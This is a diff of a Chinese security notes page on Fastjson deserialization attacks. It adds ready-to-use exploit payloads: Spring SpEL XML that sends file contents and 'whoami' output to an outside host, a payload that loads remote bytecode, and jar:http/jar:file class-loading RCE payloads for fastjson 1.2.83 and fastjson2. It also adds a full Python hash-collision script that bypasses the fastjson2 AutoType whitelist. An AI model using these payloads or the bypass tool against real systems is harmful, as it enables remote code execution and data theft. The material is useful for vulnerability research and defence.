@@ -3,7 +3,6 @@ title: "fastjson反序列化"
 modDatetime: 2025-07-25T18:47:05.000+08:00
 description: "Fastjson 反序列化常见利用链与 JdbcRowSetImpl 触发方式"
 tags: ["java", "fastjson"]
-draft: true
 ---
 
 
@@ -12,7 +11,7 @@ https://y4er.com/posts/fastjson-learn/ 学习学习
 
 ## 原生反序列化
 
-JSONArray可以从toString到getter调用
+JSONArray/JSONObject可以从toString到getter调用
 
  [chain2_bridge.md](chain2_bridge.md#fastjson JSONArray)
 
@@ -64,9 +63,89 @@ com.alibaba.fastjson.util.JavaBeanInfo#build
 
 
 
-$ref 调用 getter
+除了常规的getter调用（要求符合上述条件），还可以通过如下技巧进行任意getter的调用。
 
-通过嵌套JSON方式调用getter
+参考：https://jlkl.github.io/2021/12/18/Java_07/index.html
+
+测试类：
+
+```java
+public class Test {
+    private String cmd;
+
+    public String getCmd() throws IOException {
+        Runtime.getRuntime().exec(cmd);
+        return cmd;
+    }
+
+    public void setCmd(String cmd) {
+        this.cmd = cmd;
+    }
+}
+```
+
+$ref 调用 getter（fastjson >= 1.2.36）
+
+```json
+[{"@type":"Test","cmd":"calc"}, {"$ref":"$[0].cmd"}]
+```
+
+很好理解，要获取第一个元素的cmd属性，必然要调用getter。
+
+调用堆栈
+
+```
+at Test.getCmd(Ref_test.java:12)
+at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)
+at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+at java.lang.reflect.Method.invoke(Method.java:498)
+at com.alibaba.fastjson.util.FieldInfo.get(FieldInfo.java:571)
+at com.alibaba.fastjson.serializer.FieldSerializer.getPropertyValue(FieldSerializer.java:151)
+at com.alibaba.fastjson.serializer.JavaBeanSerializer.getFieldValue(JavaBeanSerializer.java:616)
+at com.alibaba.fastjson.JSONPath.getPropertyValue(JSONPath.java:3873)
+at com.alibaba.fastjson.JSONPath$PropertySegment.eval(JSONPath.java:2354)
+at com.alibaba.fastjson.JSONPath.eval(JSONPath.java:121)
+at com.alibaba.fastjson.parser.DefaultJSONParser.handleResovleTask(DefaultJSONParser.java:1599)
+at com.alibaba.fastjson.JSON.parse(JSON.java:244)
+```
+
+
+
+还可以通过嵌套JSON方式调用getter（fastjson < 1.2.36，恰好互补）
+
+```
+{
+    {
+        "x":{
+                "@type": "Test",
+                "cmd": "calc"
+        }
+    }: "y"
+}
+```
+
+fastjson在遇到 `{` 时，会生成JSONObject，生成了这样一个`{"x": Test@1ed4004b}`。同时，如果JSONObject作为键，会调用JSONObject#toString，从而调用了内部Test对象的getter。最后生成的还是一个JSONObject对象`{"x":{"cmd":"calc"}} -> y`，键是toString的结果。
+
+调用堆栈
+
+```
+at Test.getCmd(Test.java:7)
+at com.alibaba.fastjson.serializer.ASMSerializer_1_Test.write(Unknown Source:-1)
+at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:245)
+at com.alibaba.fastjson.serializer.MapSerializer.write(MapSerializer.java:37)
+at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:278)
+at com.alibaba.fastjson.JSON.toJSONString(JSON.java:827)
+at com.alibaba.fastjson.JSON.toString(JSON.java:821)
+at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:420)
+at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1318)
+at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1284)
+at com.alibaba.fastjson.JSON.parse(JSON.java:152)
+```
+
+
+
+用这个技巧，可以调用BasicDataSource#getConnection实现BCEL字节码加载
 
 ```json
 {
@@ -81,8 +160,6 @@ $ref 调用 getter
     }: "x"
 }
 ```
-
-
 
 ## 版本<=1.2.24
 
@@ -642,7 +719,7 @@ SafeFileOutputStream来自依赖aspectjtools
 }
 ```
 
-## 1.2.76 <= fastjson < 1.2.83
+## 1.2.76 <= fastjson <= 1.2.80
 
 禁用了AutoCloseable, 因此用Throwable
 
@@ -679,7 +756,7 @@ SafeFileOutputStream来自依赖aspectjtools
 
 ### jdbc 命令执行
 
-需要 jython + PostgreSQL + spring-context 依赖：
+需要 jython + postgresql(< 42.2.25, 42.3.0≤v<42.3.2)+ spring-context 依赖：
 
 json：
 
@@ -713,9 +790,9 @@ json：
 }
 ```
 
-exp.xml ：
+可以借助Spring进行SpEL，exp.xml ：
 
-```
+```xml
 <beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:p="http://www.springframework.org/schema/p"
@@ -728,25 +805,409 @@ exp.xml ：
 </beans>
 ```
 
-## <= 1.2.83
+或者
+
+```xml
+<bean id="x" class="java.lang.Object">
+  <property name="out" value="#{new java.lang.ProcessBuilder('calc.exe').start()}"/>
+</bean>
+```
+
+
+
+读文件回显：
+
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+        http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="x" class="java.lang.Object">
+    <property name="out" value="#{new java.net.URL('http://192.168.50.1:9999/leak/'+T(java.util.Base64).getEncoder().encodeToString(T(java.nio.file.Files).readAllBytes(new java.io.File('C:/windows/system32/drivers/etc/hosts').toPath()))).openStream().close()}"/>
+  </bean>
+</beans>
+```
+
+命令回显
+
+```java
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+        http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="x" class="java.lang.Object">
+    <property name="out" value="#{new java.net.URL('http://192.168.50.1:9999/leak/'+T(java.util.Base64).getEncoder().encodeToString(new java.lang.ProcessBuilder('whoami').start().getInputStream().readAllBytes())).openStream().close()}"/>
+  </bean>
+</beans>
+```
+
+字节码加载：
+
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+        http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="x" class="java.lang.Object">
+      <property name="out" value="#{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.apache.commoms.beanutils.coyote.cfg.PackageVersionec1070c4ce024b158e4b01ea3c652744',T(org.springframework.util.Base64Utils).decodeFromString(new String(new java.net.URL('http://127.0.0.1:8090/b64_bytecode').openStream().readAllBytes()).trim()),new java.net.URLClassLoader(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}"/>
+  </bean>
+</beans>
+```
+
+http://127.0.0.1:8090/b64_bytecode放需要执行的字节码。
+
+
+
+## 1.2.68 <= fastjson <= 1.2.83
+
+https://lorexxar.cn/2026/07/21/fs1-2-83rce/
+
+https://0d000721999.github.io/p/fastjson-1.2.83-%E6%9C%80%E6%96%B0rce%E5%88%86%E6%9E%90/
+
+https://fearsoff.org/cn/research/fastjson-1-2-83-rce（原创）
 
 无需gadget，无需autoTypeSupport。safeMode是安全的
 
 ```
-{"@type":"http:..localhost:18081.a"} 
+{"@type":"jar:http:..2130706433:19090.probe!.POC"}
 ```
 
-会被解析为`http://localhost:18081/a.class`并加载，JDK8上直接RCE
-
-- [ ] ndtd
+会被解析为`jar:http://2130706433:19090/probe!/POC`并加载。
 
 
+
+这里涉及到两个ClassLoader。
+
+第一个是资源加载的。fatjar启动的情况下，ParserConfig.class.getClassLoader()`是LaunchedURLClassLoader。会发起网络请求下载对应jar包。
+
+```java
+ParserConfig.class.getClassLoader().getResourceAsStream(resource);
+```
+
+
+
+下一步是实际加载类的地方。
+
+```java
+clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
+
+in function loadClass:
+            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+            if (contextClassLoader != null && contextClassLoader != classLoader) {
+                clazz = contextClassLoader.loadClass(className);
+```
+
+这里会再次加载`jar:http://2130706433:19090/probe!/POC`, 并返回类，在后续实例化的时候会执行static块。如果这个ClassLoader支持jar:http或jar:file即可利用。
+
+在主动设置`Thread.currentThread().setContextClassLoader(ParserConfig.class.getClassLoader())`时，classLoader为LaunchedClassLoader，支持`jar:http://`，可以一次性的实现RCE（JDK8）。类名本身也要是`jar:http://2130706433:19090/probe!/POC`，JDK9以上不支持名字中含有`://`的类加载。
+
+在默认的ClassLoader，如SprintBoot的TomcatEmbeddedWebappClassLoader中，jar:http不会发起网络访问，但可以用`jar:file:<path>`，由于getResource的时候，jar被下载并打开，可以在`/proc/self/fd`中找到。同时由于不含`://`，在JDK9以上也可以使用。此时类名应该用 `jar:file:/proc/self/fd/11!/E11`，这个jar里面可以塞满各个fd的类。
+
+类名以Exception结尾可以不报错，从而实现一个JSON，完成jar下载 + fd的爆破。但是这样就不能确定是否执行成功。
+
+
+
+总之，windows上，要求JDK8，且主动设置`Thread.currentThread().setContextClassLoader(ParserConfig.class.getClassLoader())`。
+
+linux上，使用两阶段payload，通杀fatjar启动的1.2.83，无JDK版本、ClassLoader要求。
 
 ## fastjson2 <= 2.0.62
 
 原理与1.2.83类似
 
-- [ ] ndtd
+```
+at com.alibaba.fastjson2.reader.ObjectReaderProvider.checkAutoType(ObjectReaderProvider.java:849)
+at com.alibaba.fastjson2.reader.ObjectReaderProvider.getObjectReader(ObjectReaderProvider.java:757)
+at com.alibaba.fastjson2.JSONReader$Context.getObjectReaderAutoType(JSONReader.java:5670)
+at com.alibaba.fastjson2.reader.ObjectReaderImplObject.readObject(ObjectReaderImplObject.java:119)
+at com.alibaba.fastjson2.JSONReader.read(JSONReader.java:3280)
+at com.alibaba.fastjson2.JSON.parse(JSON.java:142)
+```
+
+在checkAutoType这里，即使autoTypeSupport为false，也会进行哈希白名单匹配。而且这个哈希是逐字符增量计算FNV-1a，只要前缀的哈希在acceptHashCodes中，即可加载整个类。
+
+```java
+if (!autoTypeSupport) {
+    long hash = MAGIC_HASH_CODE;
+    for (int i = 0; i < typeNameLength; ++i) {
+        char ch = typeName.charAt(i);
+        if (ch == '$') {
+            ch = '.';
+        }
+        hash ^= ch;
+        hash *= MAGIC_PRIME;
+
+        // white list
+        if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
+            clazz = loadClass(typeName);
+```
+
+loadClass是TypeUtils.loadClass，里面会依次尝试使用contextClassLoader（默认是TomcatEmbeddedWebappClassLoader），这个无法解析jar:http。但是加载失败会使用JSON.class.getClassLoader()，在fatjar启动下，这个是LaunchedURLClassLoader。这个可以解析jar:http，从而下载jar并加载类。但是这里不会初始化，后面初始化的时候又是用的DynamicClassLoader.loadClass，它的parent还是TomcatEmbeddedWebappClassLoader，所以tomcat下无法一次性RCE，必须配合jar:file fd。
+
+```java
+ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+if (contextClassLoader != null) {
+    try {
+        return contextClassLoader.loadClass(className);
+    } catch (ClassNotFoundException ignored) {
+    }
+}
+
+try {
+    return JSON.class.getClassLoader().loadClass(className);
+}
+```
+
+因此我们只需要构造形如：
+
+````txt
+jar:http:..<ipInt>:port.x!.<collision>.Exception
+jar:file:.proc.self.fd.1!.<collision>.Exception
+````
+
+jar包为x，类名为各fd对应的payload（包括碰撞出的字符串）。
+
+acceptHashCodes默认有一个`-6293031534589903644L`，我们按照哈希计算的方法，固定前缀进行collision的爆破。
+
+```python
+//哈希计算方法
+long hash = MAGIC_HASH_CODE; 
+for (int i = 0; i < value.length(); i++) {    
+    hash = (hash ^ value.charAt(i)) * FNV_PRIME;
+}
+```
+
+碰撞脚本：
+
+```python
+#!/usr/bin/env python3
+"""FNV-1a chosen-prefix collision finder for the fastjson2 AutoType bypass.
+
+Finds 4 characters c0 c1 c2 c3 such that
+    fnv(prefix + variant + c0 + c1 + c2 + c3) == TARGET
+where fnv is the 64-bit FNV-1a hash used by fastjson2 checkAutoType.
+
+Meet-in-the-middle:
+    K   = TARGET * P^-1               (mod 2^64)
+    for every allowed c3:
+        v      = (K ^ c3) * P^-1      # v equals (h2 ^ c2)
+        table[v >> 16] = c3           # h2 and v share the high 48 bits
+    for c0, c1 (2^32 pairs):
+        h2 = fnv-after-c1
+        if h2 >> 16 in table:
+            c2 = ((K ^ table[h2>>16]) * P^-1 ^ h2) & 0xFFFF
+
+The collision table depends only on TARGET and the allowed charset, so it is
+built once and shared by every variant.  A "variant" is a short string
+appended to the prefix (a, b, c, ... aa, ab, ...) that changes h0 and gives
+an independent sweep.  Each sweep has P(>=1 hit) ~= 1 - exp(-|table|/2^16)
+~= 62%, so sweeping many variants in parallel makes failure essentially
+impossible (0.38^n -> ~1e-11 after 26 variants).
+
+Variants are processed one at a time; the 16 c0 segments of each variant run
+in one process pool.  A live single-line progress bar shows the current
+variant, the segment count, the cumulative expected hit probability and the
+elapsed time.  The first hit terminates the run.
+
+Usage:
+    python fnv_collision.py
+    python fnv_collision.py --prefix "jar:http:..2130706433:18083.x!."
+    python fnv_collision.py --no-progress
+"""
+
+import argparse
+import itertools
+import math
+import multiprocessing as mp
+import string
+import sys
+import time
+
+import numpy as np
+
+PRIME = 0x100000001B3
+OFFSET = 0xCBF29CE484222325
+MASK = (1 << 64) - 1
+INV_PRIME = pow(PRIME, -1, 1 << 64)
+
+DEFAULT_TARGET = 0xA8AAA929446FFCE4  # -6293031534589903644L, acceptHashCodes[0]
+DEFAULT_PREFIX = "jar:http:..2130706433:18083.x!."
+
+
+def fnv(text):
+    """64-bit FNV-1a over the code points of text ('$' normalised to '.')."""
+    h = OFFSET
+    for ch in text:
+        c = ord(ch)
+        if c == ord('$'):
+            c = ord('.')
+        h = ((h ^ c) * PRIME) & MASK
+    return h
+
+
+def allowed_full(c):
+    """Any BMP char except surrogates and the characters that would corrupt a
+    jar: URL path ('/' separates path segments, '!' marks the jar entry,
+    '?'/'#' start query/fragment, '"'/'\\' need JSON escaping)."""
+    if 0xD800 <= c <= 0xDFFF:
+        return False
+    return chr(c) not in '/!#?\\"'
+
+
+def build_table(target, allowed):
+    """Build the backward collision table once (independent of the prefix)."""
+    k = (target * INV_PRIME) & MASK
+    table = {}
+    for c3 in range(0x10000):
+        if not allowed(c3):
+            continue
+        v = ((k ^ c3) * INV_PRIME) & MASK
+        table.setdefault(v >> 16, c3)
+    keys = np.fromiter(sorted(table), dtype=np.uint64)
+    c3s = np.fromiter((table[kk] for kk in sorted(table)), dtype=np.uint64)
+    return keys, c3s
+
+
+def scan(prefix_hash, target, keys, c3s, allowed, c0_lo, c0_hi):
+    """Scan c0 in [lo, hi), all allowed c1. Returns list of (c0, c1, c2, c3)."""
+    k = (target * INV_PRIME) & MASK
+    n = len(keys)
+    c1s = np.array([c for c in range(0x10000) if allowed(c)], dtype=np.uint64)
+    hits = []
+    for c0 in range(c0_lo, c0_hi):
+        if not allowed(c0):
+            continue
+        h1 = ((prefix_hash ^ c0) * PRIME) & MASK
+        h2 = ((h1 ^ c1s) * PRIME) & MASK
+        q = h2 >> np.uint64(16)
+        idx = np.searchsorted(keys, q, side='left')
+        safe = np.minimum(idx, n - 1)
+        good = (idx < n) & (keys[safe] == q)
+        if not good.any():
+            continue
+        for j in np.flatnonzero(good):
+            c3 = int(c3s[idx[j]])
+            c1 = int(c1s[j])
+            c2 = ((k ^ c3) * INV_PRIME ^ int(h2[j])) & 0xFFFF
+            if allowed(c2):
+                hits.append((c0, c1, c2, c3))
+    return hits
+
+
+def worker(args):
+    variant, prefix_hash, target, keys, c3s, allowed, lo, hi = args
+    return variant, scan(prefix_hash, target, keys, c3s, allowed, lo, hi)
+
+
+def variants(max_len):
+    """Yield variant suffixes: '', 'a', 'b', ..., 'z', 'aa', 'ab', ..."""
+    yield ""
+    for n in range(1, max_len + 1):
+        for tup in itertools.product(string.ascii_lowercase, repeat=n):
+            yield "".join(tup)
+
+
+def fmt_line(vi, total, variant, seg_i, segments, cum_variants,
+             p_cum, elapsed):
+    return (f"\r[prog] variant {vi + 1:>5}/{total} {variant!r:<10} "
+            f"seg {seg_i:>2}/{segments}  scanned {cum_variants:6.2f} variants "
+            f"P(hit) {p_cum:5.1%}  elapsed {elapsed:6.1f}s")
+
+
+def main():
+    ap = argparse.ArgumentParser(description="fastjson2 FNV-1a collision finder")
+    ap.add_argument("--prefix", default=DEFAULT_PREFIX)
+    ap.add_argument("--target", type=lambda s: int(s, 0), default=DEFAULT_TARGET)
+    ap.add_argument("--threads", type=int, default=mp.cpu_count())
+    ap.add_argument("--segments", type=int, default=16,
+                    help="how many c0 segments to split each variant into")
+    ap.add_argument("--max-variant-len", type=int, default=2,
+                    help="auto-sweep variants up to this length (default 2)")
+    ap.add_argument("--no-progress", action="store_true", dest="no_progress")
+    args = ap.parse_args()
+
+    print(f"prefix  = {args.prefix!r}")
+    print(f"target  = {args.target:016x}")
+    keys, c3s = build_table(args.target, allowed_full)
+    print(f"table   = {len(keys)} keys (built once)")
+
+    segments = args.segments
+    threads = min(args.threads, segments)
+    vs = list(variants(args.max_variant_len))
+    p_hit = 1.0 - math.exp(-len(keys) / 0x10000)
+    print(f"variants= {len(vs)}, pool={threads}, P(hit)/variant ~= {p_hit:.1%}")
+
+    found = None
+    t0 = time.monotonic()
+    cum = 0.0
+    with mp.Pool(threads) as pool:
+        for vi, variant in enumerate(vs):
+            h0 = fnv(args.prefix + variant)
+            tasks = [
+                (variant, h0, args.target, keys, c3s, allowed_full,
+                 s * 0x10000 // segments, (s + 1) * 0x10000 // segments)
+                for s in range(segments)
+            ]
+            for seg_i, (_, sols) in enumerate(pool.imap_unordered(worker, tasks), 1):
+                if sols:
+                    found = (variant, sols[0])
+                    break
+                if not args.no_progress:
+                    cum += 1.0 / segments
+                    sys.stdout.write(fmt_line(
+                        vi, len(vs), variant, seg_i, segments,
+                        cum, 1.0 - (1.0 - p_hit) ** cum, time.monotonic() - t0))
+                    sys.stdout.flush()
+            if found:
+                pool.terminate()
+                break
+
+    if not args.no_progress:
+        print()
+
+    if not found:
+        print("no collision found — raise --max-variant-len")
+        return
+
+    variant, (c0, c1, c2, c3) = found
+    suffix = ''.join(map(chr, (c0, c1, c2, c3)))
+    full = args.prefix + variant + suffix + "!.Evil"
+    h = fnv(args.prefix + variant + suffix)
+    esc = ''.join(chr(c) if 0x20 <= c < 0x7F else '\\u%04x' % c
+                  for c in map(ord, full))
+    print("=" * 60)
+    print(f"variant = {variant!r}")
+    print(f"suffix  = {suffix!r}  chars = {['U+%04X' % c for c in (c0, c1, c2, c3)]}")
+    print(f"hash    = {h:016x} == target? {h == args.target}")
+    print(f"@type   = {full!r}")
+    print(f"@type   = {esc}")
+    print(f"jar     = {full.replace('.', '/')}")
+    print(f"time    = {time.monotonic() - t0:.1f}s")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+然后就是根据结果生成jar，发payload即可。
+
+JSON.parse要用数组形式
+
+```json
+[{"@type":"jar:http..<ipInt>.<port>...."}, {"@type":"jar:file.proc.self.fd...."}]
+```
+
+JSON.parseObject( , Object.class) 要用原始的
+
+```json
+{"@type":"jar:http..<ipInt>.<port>...."}
+```
+
+JSON.parseObject(, Holder.class)要用
+
+```json
+{"obj": {"@type":"jar:http..<ipInt>.<port>...."}}
+```
 
 ## tricks
 
@@ -761,30 +1222,6 @@ fastjson支持unicode、hex编码，可以绕过简单的字符串模式匹配
 ```json
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-反序列化链：
-
-TemplateImpl
-JdbcRowSetImpl
-Tomcat BasicDataSource
-
-
 
 ## 参考链接
 
